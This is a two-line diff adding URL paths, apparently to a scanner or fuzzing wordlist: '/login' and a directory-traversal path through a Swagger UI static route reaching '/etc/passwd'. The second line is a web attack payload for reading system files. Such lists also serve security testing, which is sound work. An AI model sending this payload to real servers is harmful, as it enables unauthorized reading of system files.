@@ -1,0 +1,2 @@
+/login
+/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd
